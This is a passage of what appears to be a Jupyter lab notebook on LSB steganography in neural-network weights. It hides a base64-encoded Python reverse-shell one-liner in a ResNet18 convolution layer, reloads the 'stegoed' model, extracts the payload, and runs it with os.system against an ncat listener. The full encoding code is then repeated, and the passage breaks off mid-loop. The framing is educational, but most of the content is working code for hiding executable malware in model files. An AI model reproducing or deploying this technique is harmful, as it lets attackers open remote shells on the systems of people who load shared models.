  {
   "cell_type": "code",
   "execution_count": 112,
   "id": "6780d314",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "ResNet(\n",
       "  (conv1): Conv2d(3, 64, kernel_size=(7, 7), stride=(2, 2), padding=(3, 3), bias=False)\n",
       "  (bn1): BatchNorm2d(64, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "  (relu): ReLU(inplace=True)\n",
       "  (maxpool): MaxPool2d(kernel_size=3, stride=2, padding=1, dilation=1, ceil_mode=False)\n",
       "  (layer1): Sequential(\n",
       "    (0): BasicBlock(\n",
       "      (conv1): Conv2d(64, 64, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn1): BatchNorm2d(64, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      (relu): ReLU(inplace=True)\n",
       "      (conv2): Conv2d(64, 64, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn2): BatchNorm2d(64, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "    )\n",
       "    (1): BasicBlock(\n",
       "      (conv1): Conv2d(64, 64, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn1): BatchNorm2d(64, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      (relu): ReLU(inplace=True)\n",
       "      (conv2): Conv2d(64, 64, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn2): BatchNorm2d(64, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "    )\n",
       "  )\n",
       "  (layer2): Sequential(\n",
       "    (0): BasicBlock(\n",
       "      (conv1): Conv2d(64, 128, kernel_size=(3, 3), stride=(2, 2), padding=(1, 1), bias=False)\n",
       "      (bn1): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      (relu): ReLU(inplace=True)\n",
       "      (conv2): Conv2d(128, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn2): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      (downsample): Sequential(\n",
       "        (0): Conv2d(64, 128, kernel_size=(1, 1), stride=(2, 2), bias=False)\n",
       "        (1): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      )\n",
       "    )\n",
       "    (1): BasicBlock(\n",
       "      (conv1): Conv2d(128, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn1): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      (relu): ReLU(inplace=True)\n",
       "      (conv2): Conv2d(128, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn2): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "    )\n",
       "  )\n",
       "  (layer3): Sequential(\n",
       "    (0): BasicBlock(\n",
       "      (conv1): Conv2d(128, 256, kernel_size=(3, 3), stride=(2, 2), padding=(1, 1), bias=False)\n",
       "      (bn1): BatchNorm2d(256, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      (relu): ReLU(inplace=True)\n",
       "      (conv2): Conv2d(256, 256, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn2): BatchNorm2d(256, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      (downsample): Sequential(\n",
       "        (0): Conv2d(128, 256, kernel_size=(1, 1), stride=(2, 2), bias=False)\n",
       "        (1): BatchNorm2d(256, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      )\n",
       "    )\n",
       "    (1): BasicBlock(\n",
       "      (conv1): Conv2d(256, 256, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn1): BatchNorm2d(256, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      (relu): ReLU(inplace=True)\n",
       "      (conv2): Conv2d(256, 256, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn2): BatchNorm2d(256, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "    )\n",
       "  )\n",
       "  (layer4): Sequential(\n",
       "    (0): BasicBlock(\n",
       "      (conv1): Conv2d(256, 512, kernel_size=(3, 3), stride=(2, 2), padding=(1, 1), bias=False)\n",
       "      (bn1): BatchNorm2d(512, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      (relu): ReLU(inplace=True)\n",
       "      (conv2): Conv2d(512, 512, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn2): BatchNorm2d(512, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      (downsample): Sequential(\n",
       "        (0): Conv2d(256, 512, kernel_size=(1, 1), stride=(2, 2), bias=False)\n",
       "        (1): BatchNorm2d(512, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      )\n",
       "    )\n",
       "    (1): BasicBlock(\n",
       "      (conv1): Conv2d(512, 512, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn1): BatchNorm2d(512, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "      (relu): ReLU(inplace=True)\n",
       "      (conv2): Conv2d(512, 512, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False)\n",
       "      (bn2): BatchNorm2d(512, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)\n",
       "    )\n",
       "  )\n",
       "  (avgpool): AdaptiveAvgPool2d(output_size=(1, 1))\n",
       "  (fc): Linear(in_features=512, out_features=1000, bias=True)\n",
       ")"
      ]
     },
     "execution_count": 112,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Getting the model file\n",
    "loaded_model = torch.load(f='/tmp/model_stegoed.pt', map_location=device, weights_only=False)\n",
    "\n",
    "# There is nothing initially suspicious here.\n",
    "loaded_model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 113,
   "id": "bf47675d",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "tensor(107, device='cuda:0')"
      ]
     },
     "execution_count": 113,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Validate the loaded model can make predictions\n",
    "loaded_model(sample.to(device)).argmax()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5328a533",
   "metadata": {},
   "source": [
    "Because we know which layer we embed our malicious payload, we can now retrieve that layer from the model and attempt to recover the content.   \n",
    "\n",
    "### Step 16:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 114,
   "id": "a59d9dcc",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "tensor([ 0.0002, -0.0147, -0.0170, -0.0129, -0.0331, -0.0367,  0.0278,  0.0177])"
      ]
     },
     "execution_count": 114,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# We know the layer our data is saved in, so let us extract it\n",
    "conv_layer_to_decode = loaded_model.layer4[0].conv2.weight.data.cpu()\n",
    "\n",
    "# Let's flatten it like we did during the encoding process\n",
    "conv_layer_to_decode = conv_layer_to_decode.reshape(-1)\n",
    "\n",
    "# We know the first 8 bytes, tells our payload length\n",
    "get_content_length = conv_layer_to_decode[:8]\n",
    "get_content_length"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 115,
   "id": "1dfa8d04",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([  959057717, -1133433879, -1131723915, -1135441611, -1123580813,\n",
       "       -1122622227,  1021564562,  1016130576])"
      ]
     },
     "execution_count": 115,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Recover these values by first converting them to integers\n",
    "# This is similar to what we did above \n",
    "\n",
    "tmp_int = np.array([], dtype=np.int32)\n",
    "for i in range(len(get_content_length)):\n",
    "    #print(struct.unpack('@i', struct.pack('@f', get_conten_length[i]))[0])\n",
    "    tmp_int = np.append(tmp_int, struct.unpack('@i', struct.pack('@f', get_content_length[i]))[0])\n",
    "\n",
    "tmp_int"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 116,
   "id": "d6ef35cb",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['1', '1', '1', '1', '1', '1', '0', '0']"
      ]
     },
     "execution_count": 116,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Get the lsb status\n",
    "# Note, all of this could have been done above, just doing it this way for simplicity\n",
    "# c is just another temporary array\n",
    "c = np.array([], dtype=np.int32)\n",
    "for i in range(len(tmp_int)):\n",
    "    # Let's also cast these values to a string and then a list\n",
    "    # This is to ensure we can join the string values\n",
    "    # We cannot join the integers without casting them to string\n",
    "    c = np.append(arr=c, values=tmp_int[i] % 2).astype(str).tolist()\n",
    "\n",
    "c"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "80933aa7",
   "metadata": {},
   "source": [
    "Remember, the first eight bytes represent our total payload length. These bits above represent the length.  let's now join them to get our length.   At the same time, convert the binary string to an integer.  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 117,
   "id": "d013cea1",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "252"
      ]
     },
     "execution_count": 117,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# The value returned here, tells us how many bytes after the length to decoded \n",
    "# to get our data\n",
    "payload_len_to_decode = int(''.join(c), base=2)\n",
    "payload_len_to_decode"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "493d2834",
   "metadata": {},
   "source": [
    "The value above tells us how many bytes from this length, we need to read to get to our payload. Going back into the layer.  \n",
    "\n",
    "Remember, it is in each byte that the LSB is manipulated. Hence with a payload length of 252, it means we need 252 bytes*8, because we are only taking 1 bit from each byte. Added plus 8 here, because we want to get to payload length + 8 bytes after our 8 bytes that were taken out to get the payload length.  \n",
    "\n",
    "### Step 17:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 118,
   "id": "29779d1b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "tensor([-0.0184,  0.0105,  0.0314,  0.0248, -0.0127, -0.0295, -0.0118, -0.0094,\n",
       "        -0.0089, -0.0313])"
      ]
     },
     "execution_count": 118,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Read our data\n",
    "payload_to_decode = conv_layer_to_decode[8:payload_len_to_decode*8 + 8]\n",
    "payload_to_decode[:10]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 119,
   "id": "21019bf0",
   "metadata": {},
   "outputs": [],
   "source": [
    "# by now, you should recognize, because we are doing certain tasks often,\n",
    "# We should create a function for some of this activity\n",
    "# Let's do that\n",
    "\n",
    "def convert_from_float_to_int(data:np.array=None):\n",
    "    tmp_int = np.array([], dtype=np.int32)\n",
    "    for i in range(len(data)):\n",
    "        #print(struct.unpack('@i', struct.pack('@f', data[i]))[0])\n",
    "        tmp_int = np.append(tmp_int, struct.unpack('@i', struct.pack('@f', data[i]))[0])\n",
    "\n",
    "    return tmp_int"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 120,
   "id": "ee8afc66",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([-1130988662,  1009548823,  1023444897,  1019947860, -1135604588,\n",
       "       -1125038234, -1136532787, -1139136029, -1139633418, -1124046845])"
      ]
     },
     "execution_count": 120,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Call the function to get the data\n",
    "int_data_from_float = convert_from_float_to_int(data=payload_to_decode)\n",
    "int_data_from_float[:10]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 121,
   "id": "a5d0db4a",
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's also create a function to get the status of the Least significant bits\n",
    "def get_lsb_status(int_data:np.array=None):\n",
    "    c = np.array([], dtype=np.int32)\n",
    "    for i in range(len(int_data)):\n",
    "        c = np.append(arr=c, values=int_data[i] % 2).astype(str).tolist()\n",
    "\n",
    "    return c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 122,
   "id": "b75af7fa",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['0', '1', '1', '0', '0', '0', '1', '1', '0', '1', '0', '0', '1', '0', '0', '0', '0', '1', '1', '0', '1', '1', '0', '0', '0', '0', '1', '1', '0', '0', '0', '0', '0', '1', '1', '0', '0', '0', '0', '1', '0', '1', '0', '0', '0', '1', '1', '1', '0', '0', '1', '1', '1', '0', '0', '1', '0', '1', '1', '1', '0', '1', '0', '1', '0', '1', '0', '0', '1', '0', '0', '1', '0', '1', '0', '0', '0', '0', '1', '1', '0', '0', '1', '1', '0', '0', '0', '1', '0', '1', '1', '0', '1', '0', '1', '0', '0', '1', '0', '0', '1', '0', '0', '1', '0', '1', '0', '0', '0', '0', '1', '1', '0', '1', '1', '0', '0', '1', '0', '0', '0', '1', '1', '0', '1', '0', '0', '0', '0', '1', '0', '1', '0', '0', '0', '0', '0', '1', '0', '1', '0', '1', '1', '0', '0', '0', '1', '1', '1', '0', '0', '1', '0', '1', '1', '0', '0', '1', '1', '0', '0', '1', '1', '0', '0', '0', '0', '1', '0', '1', '0', '1', '0', '1', '1', '1', '0', '0', '1', '1', '0', '0', '0', '1', '0', '1', '1', '1', '0', '1', '1', '1', '0', '1', '1', '0', '0', '0', '1', '0', '0', '0', '1', '1', '0', '0', '1', '1', '0', '1', '0', '0', '1', '0', '1', '0', '0', '0', '1', '1', '0', '0', '0', '0', '0', '1', '0', '1', '1', '0', '0', '0', '0', '0', '1', '1', '0', '0', '0', '1', '0', '0', '1', '1', '1', '0', '0', '0', '0', '0', '1', '1', '0', '1', '1', '1', '0', '1', '1', '0', '0', '0', '1', '1', '0', '1', '1', '1', '1', '0', '1', '0', '0', '0', '1', '1', '0', '0', '0', '1', '0', '1', '1', '0', '1', '0', '0', '0', '0', '1', '0', '0', '1', '0', '1', '1', '0', '1', '0', '0', '0', '0', '1', '1', '0', '1', '0', '0', '1', '0', '1', '0', '0', '1', '1', '1', '1', '0', '1', '0', '0', '1', '1', '0', '0', '0', '1', '0', '0', '0', '1', '1', '0', '0', '1', '0', '0', '1', '0', '0', '1', '1', '1', '0', '0', '1', '1', '1', '0', '0', '1', '0', '0', '1', '0', '1', '1', '0', '1', '0', '0', '1', '0', '1', '1', '0', '0', '0', '0', '1', '0', '1', '0', '0', '0', '1', '0', '1', '1', '0', '1', '0', '0', '1', '0', '1', '0', '0', '1', '0', '1', '1', '0', '1', '0', '1', '0', '1', '0', '0', '0', '1', '1', '1', '0', '1', '0', '0', '0', '1', '1', '1', '0', '1', '1', '0', '0', '1', '0', '1', '0', '0', '0', '0', '0', '1', '0', '1', '0', '1', '1', '1', '0', '1', '0', '0', '0', '1', '0', '1', '0', '1', '1', '0', '1', '1', '1', '1', '0', '1', '0', '0', '1', '0', '0', '1', '0', '1', '1', '0', '1', '1', '0', '1', '0', '0', '1', '1', '1', '0', '0', '1', '0', '1', '1', '1', '1', '0', '1', '0', '0', '1', '0', '0', '1', '0', '0', '1', '0', '1', '1', '0', '1', '0', '0', '1', '0', '1', '1', '0', '1', '0', '1', '1', '0', '1', '1', '1', '0', '1', '0', '1', '0', '1', '0', '1', '1', '0', '1', '0', '0', '1', '0', '0', '1', '0', '0', '0', '0', '1', '0', '1', '0', '1', '1', '0', '0', '1', '1', '1', '0', '1', '1', '1', '0', '1', '0', '0', '1', '1', '0', '1', '0', '1', '1', '0', '1', '0', '1', '0', '0', '1', '1', '1', '0', '1', '0', '0', '0', '1', '1', '1', '0', '1', '1', '1', '0', '1', '0', '1', '0', '0', '0', '0', '0', '1', '0', '1', '0', '1', '1', '1', '0', '1', '0', '0', '0', '1', '0', '1', '0', '1', '1', '0', '1', '1', '1', '1', '0', '1', '0', '0', '1', '0', '0', '1', '0', '1', '1', '0', '1', '1', '1', '0', '0', '1', '0', '0', '0', '0', '1', '0', '0', '0', '1', '1', '0', '0', '0', '0', '0', '1', '1', '0', '0', '1', '0', '1', '0', '1', '0', '1', '0', '0', '1', '1', '0', '1', '0', '0', '1', '0', '0', '1', '0', '1', '1', '1', '0', '0', '0', '0', '0', '1', '0', '0', '1', '1', '0', '0', '0', '1', '1', '0', '1', '1', '1', '0', '0', '1', '0', '0', '1', '1', '1', '0', '0', '1', '1', '1', '0', '1', '1', '1', '0', '1', '0', '1', '1', '0', '0', '1', '0', '1', '0', '1', '1', '0', '0', '0', '0', '1', '1', '0', '0', '1', '0', '0', '0', '1', '1', '1', '0', '1', '0', '1', '0', '1', '0', '0', '1', '1', '1', '1', '0', '0', '1', '1', '0', '0', '1', '0', '0', '1', '0', '0', '1', '1', '0', '1', '0', '0', '1', '1', '1', '0', '0', '1', '0', '1', '1', '0', '0', '0', '1', '1', '0', '1', '1', '1', '1', '0', '0', '1', '0', '0', '1', '1', '0', '1', '0', '1', '0', '1', '1', '1', '1', '0', '1', '0', '0', '1', '1', '0', '0', '0', '1', '0', '0', '0', '1', '1', '0', '0', '1', '0', '0', '1', '0', '0', '1', '1', '1', '0', '0', '1', '1', '1', '0', '0', '1', '0', '0', '1', '0', '1', '1', '0', '1', '0', '0', '1', '0', '1', '1', '0', '0', '0', '0', '1', '0', '1', '0', '0', '0', '1', '0', '1', '1', '0', '1', '1', '1', '1', '0', '1', '1', '0', '0', '0', '1', '1', '0', '1', '1', '1', '1', '0', '0', '1', '0', '0', '1', '1', '0', '1', '0', '1', '0', '1', '0', '0', '0', '0', '1', '0', '0', '1', '0', '1', '0', '0', '1', '0', '0', '1', '1', '0', '1', '1', '0', '0', '0', '0', '1', '1', '1', '0', '0', '1', '0', '1', '0', '0', '1', '0', '1', '0', '0', '1', '0', '1', '0', '1', '0', '0', '0', '1', '1', '0', '1', '0', '1', '1', '0', '1', '0', '1', '0', '1', '1', '0', '0', '1', '0', '1', '0', '1', '0', '1', '0', '1', '0', '0', '1', '1', '0', '0', '0', '1', '0', '0', '1', '0', '0', '0', '0', '1', '0', '0', '1', '1', '0', '1', '0', '1', '1', '1', '0', '1', '0', '1', '0', '1', '0', '1', '0', '1', '0', '1', '0', '0', '1', '1', '0', '0', '0', '0', '0', '0', '1', '1', '1', '0', '0', '1', '0', '1', '0', '0', '0', '1', '0', '0', '0', '1', '0', '1', '0', '0', '1', '1', '0', '0', '1', '1', '0', '0', '0', '1', '0', '0', '1', '1', '1', '0', '0', '1', '0', '1', '0', '1', '0', '1', '0', '0', '0', '1', '0', '1', '0', '1', '1', '0', '0', '1', '0', '0', '0', '1', '1', '0', '0', '1', '0', '0', '1', '0', '1', '0', '0', '1', '0', '0', '0', '1', '1', '0', '0', '1', '0', '1', '0', '0', '0', '1', '0', '1', '0', '1', '0', '1', '0', '1', '0', '0', '1', '1', '0', '0', '0', '0', '0', '1', '1', '1', '0', '0', '0', '0', '0', '1', '0', '0', '1', '1', '1', '1', '0', '0', '1', '1', '0', '0', '1', '0', '0', '1', '0', '0', '1', '1', '0', '1', '0', '1', '1', '1', '0', '1', '0', '1', '0', '1', '0', '1', '1', '0', '0', '1', '0', '0', '1', '1', '0', '0', '1', '0', '0', '0', '1', '1', '1', '0', '0', '1', '0', '1', '1', '1', '0', '1', '0', '1', '0', '1', '1', '0', '0', '0', '1', '0', '0', '1', '1', '0', '1', '1', '0', '1', '0', '1', '0', '1', '0', '1', '1', '0', '0', '1', '1', '0', '1', '0', '1', '0', '0', '1', '1', '0', '0', '1', '0', '0', '0', '1', '0', '0', '0', '0', '1', '1', '0', '1', '1', '0', '0', '1', '1', '1', '0', '1', '1', '0', '1', '1', '1', '1', '0', '1', '0', '0', '1', '0', '0', '1', '0', '1', '1', '0', '1', '0', '1', '0', '0', '1', '0', '0', '0', '1', '0', '1', '0', '1', '1', '1', '1', '0', '0', '1', '0', '1', '0', '0', '1', '1', '1', '0', '0', '1', '1', '1', '1', '0', '0', '1', '0', '0', '1', '1', '0', '1', '0', '0', '0', '1', '1', '1', '0', '1', '1', '1', '0', '1', '0', '0', '1', '1', '0', '0', '0', '1', '1', '0', '1', '0', '1', '0', '0', '1', '0', '0', '0', '0', '0', '1', '0', '1', '1', '1', '0', '1', '0', '1', '0', '1', '0', '0', '1', '1', '0', '1', '0', '1', '0', '1', '0', '0', '1', '1', '0', '1', '0', '0', '1', '0', '0', '1', '0', '1', '1', '1', '0', '0', '1', '1', '0', '1', '0', '0', '1', '1', '1', '1', '0', '1', '0', '1', '0', '1', '0', '0', '0', '1', '1', '0', '1', '0', '1', '1', '0', '0', '1', '1', '0', '1', '0', '1', '0', '1', '0', '0', '1', '1', '1', '1', '0', '1', '0', '1', '0', '0', '1', '1', '0', '1', '1', '0', '1', '0', '1', '1', '0', '1', '1', '1', '0', '0', '0', '0', '0', '1', '0', '0', '1', '1', '1', '1', '0', '0', '1', '1', '0', '0', '1', '0', '0', '1', '0', '1', '1', '0', '0', '1', '0', '0', '1', '1', '1', '0', '0', '1', '0', '1', '0', '1', '1', '0', '0', '1', '0', '1', '1', '1', '1', '0', '0', '1', '0', '0', '1', '1', '0', '1', '0', '1', '0', '1', '1', '0', '1', '1', '0', '1', '0', '1', '1', '0', '0', '0', '0', '1', '0', '1', '0', '1', '0', '1', '1', '1', '0', '1', '1', '1', '1', '0', '0', '0', '0', '1', '1', '0', '1', '1', '0', '0', '0', '1', '1', '0', '0', '0', '1', '0', '0', '1', '1', '0', '1', '1', '0', '1', '0', '0', '1', '1', '1', '0', '0', '0', '0', '0', '1', '1', '0', '1', '1', '1', '0', '1', '1', '0', '0', '0', '1', '0', '0', '1', '1', '1', '1', '0', '0', '1', '0', '1', '1', '0', '1', '0', '0', '0', '0', '1', '1', '0', '1', '1', '0', '1', '0', '1', '0', '0', '1', '0', '1', '1', '0', '1', '0', '0', '0', '0', '1', '1', '0', '1', '1', '0', '1', '0', '1', '1', '0', '1', '1', '1', '0', '0', '1', '1', '0', '1', '0', '0', '1', '1', '0', '1', '0', '1', '0', '0', '0', '0', '1', '1', '0', '1', '1', '0', '1', '0', '1', '1', '0', '0', '1', '1', '0', '1', '1', '1', '0', '1', '1', '0', '0', '0', '1', '0', '0', '1', '1', '1', '1', '0', '0', '1', '0', '1', '1', '0', '1', '0', '0', '0', '0', '1', '1', '0', '1', '1', '0', '1', '0', '1', '0', '0', '1', '0', '1', '1', '0', '1', '0', '0', '0', '0', '1', '1', '0', '1', '1', '0', '1', '0', '1', '1', '0', '1', '1', '1', '0', '0', '1', '1', '0', '1', '0', '0', '1', '1', '0', '1', '0', '1', '0', '1', '0', '0', '1', '1', '0', '1', '1', '0', '1', '0', '1', '1', '0', '0', '1', '1', '0', '1', '1', '1', '0', '1', '1', '0', '0', '0', '1', '0', '0', '1', '1', '1', '1', '0', '0', '1', '0', '1', '1', '0', '1', '0', '0', '0', '0', '1', '1', '0', '1', '1', '0', '1', '0', '1', '0', '0', '1', '0', '1', '1', '0', '1', '0', '0', '0', '0', '1', '1', '0', '1', '1', '0', '1', '0', '1', '1', '0', '1', '1', '1', '0', '0', '1', '1', '0', '1', '0', '0', '1', '1', '0', '1', '0', '1', '1', '0', '1', '0', '0', '1', '0', '1', '1', '0', '1', '0', '1', '1', '0', '0', '1', '1', '0', '1', '1', '1', '0', '1', '1', '0', '0', '0', '1', '1', '0', '1', '0', '0', '0', '0', '1', '1', '0', '1', '1', '0', '0', '1', '1', '1', '0', '1', '1', '0', '1', '0', '0', '1', '0', '1', '0', '0', '1', '1', '0', '0', '0', '0', '1', '1', '0', '0', '1', '0', '0', '1', '0', '0', '1', '0', '1', '0', '0', '1', '1', '1', '0', '0', '0', '0', '0', '1', '1', '0', '0', '0', '1', '0', '0', '1', '1', '0', '1', '0', '0', '1', '0', '0', '1', '1', '1', '0', '0', '1', '0', '1', '1', '1', '1', '0', '1', '0', '0', '1', '1', '0', '0', '0', '0', '1', '0', '1', '0', '0', '0', '0', '1', '1', '0', '1', '0', '0', '1', '0', '0', '1', '0', '1', '1', '1', '0', '0', '0', '0', '0', '1', '0', '0', '1', '0', '1', '0', '0', '1', '1', '1', '1', '0', '0', '1', '0', '1', '0', '1', '1', '0', '0', '1', '0', '0', '1', '1', '1', '1', '0', '1']\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "(None, 2016)"
      ]
     },
     "execution_count": 122,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Call the function to get the lsb data\n",
    "get_lsbs = get_lsb_status(int_data=int_data_from_float)\n",
    "print(get_lsbs), len(get_lsbs)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 123,
   "id": "1cb08663",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Let's wrap this up with a function to recover the string\n",
    "# 8 bits make a byte, hence we are going through this in groups of 8\n",
    "# All of this could be done on one line, just keeping it simple by having multiple lines\n",
    "# Insert print statements before and after if you wish to see what is going on\n",
    "# Do keep in mind, this process was already done above.\n",
    "\n",
    "def recover_final_data(data:list=[]):\n",
    "    str_array = [get_lsbs[i:i+8  ] for i in range(0, len(get_lsbs), 8)]\n",
    "    bits_joined = [ ''.join(i) for i in str_array ]\n",
    "    b64_payload = ''.join([chr(int(i, base=2)) for i in bits_joined])\n",
    "    data_decoded = base64.b64decode(s=b64_payload)\n",
    "    return data_decoded"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 124,
   "id": "b674b345",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'python -c \\'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"127.0.0.1\",9999));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")\\'&'"
      ]
     },
     "execution_count": 124,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Call the function\n",
    "recover_final_data(data=get_lsbs)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "06e7d912",
   "metadata": {},
   "source": [
    "Remember to setup your listener   \n",
    "\n",
    "$ ncat --verbose --listen 9999   \n",
    "Ncat: Version 7.94SVN ( https://nmap.org/ncat )   \n",
    "Ncat: Listening on [::]:9999   \n",
    "Ncat: Listening on 0.0.0.0:9999   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 125,
   "id": "8b824bb9",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 125,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# If we wanted to, we can now execute our code\n",
    "# ncat --verbose --listen 9999\n",
    "\n",
    "os.system(command=recover_final_data(data=get_lsbs))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fc222520",
   "metadata": {},
   "source": [
    "There we go!!\n",
    "\n",
    "### Lab Takeaways:  \n",
    "- We were able to perform LSB steganography  \n",
    "- We did the encoding process   \n",
    "- We did the decoding process   \n",
    "- We leveraged ncat as a listener to access a reverse shell   \n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bdeb70b1",
   "metadata": {},
   "source": [
    "### Wrapping it up\n",
    "Let's put everything together \n",
    "\n",
    "# Encoding process"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 126,
   "id": "06ef30ae",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Traceback (most recent call last):\n",
      "  File \"<string>\", line 1, in <module>\n",
      "ConnectionRefusedError: [Errno 111] Connection refused\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The number of bytes needed for encoding is: 2024\n"
     ]
    }
   ],
   "source": [
    "import torch\n",
    "from torchvision.models import resnet18, ResNet18_Weights\n",
    "import struct\n",
    "import base64\n",
    "import numpy as np\n",
    "import os\n",
    "\n",
    "\n",
    "model = resnet18(weights=ResNet18_Weights.DEFAULT)\n",
    "model.eval()\n",
    "\n",
    "conv_layer_extracted = model.layer4[0].conv2.weight.data.numpy()\n",
    "conv_layer_shape = conv_layer_extracted.shape\n",
    "conv_layer_flat = conv_layer_extracted.reshape(-1)\n",
    "\n",
    "payload = b\"\"\"python -c 'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"127.0.0.1\",9999));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'&\"\"\"\n",
    "#payload_len = len(payload)\n",
    "\n",
    "payload_b64_encoded = base64.b64encode(payload)\n",
    "payload_encoded = np.frombuffer(payload_b64_encoded, dtype=np.uint8)\n",
    "payload_len = payload_encoded.shape[0]\n",
    "\n",
    "encoded_data_w_len = np.r_[[payload_len], payload_encoded]\n",
    "encoded_data_w_len = np.array(encoded_data_w_len, dtype=np.uint8)\n",
    "\n",
    "encoded_bits = np.unpackbits(encoded_data_w_len)\n",
    "print(f'The number of bytes needed for encoding is: {len(encoded_bits)}')\n",
    "\n",
    "bytes_manipulated = np.array([], dtype=np.int32)\n",
    "\n",
    "for i in range(encoded_bits.size):\n",
    "    bytes_manipulated = np.append(bytes_manipulated, struct.unpack('@i', struct.pack('@f', conv_layer_flat[i]))[0]).astype(np.int32)\n",
    "\n",
    "\n",
    "bytesRounded = bytes_manipulated -  bytes_manipulated % 2\n",
    "encoded_data = bytesRounded + encoded_bits\n",
    "\n",
    "tmp_float = np.array([])\n",
    "for idx, value in enumerate(encoded_data):\n",
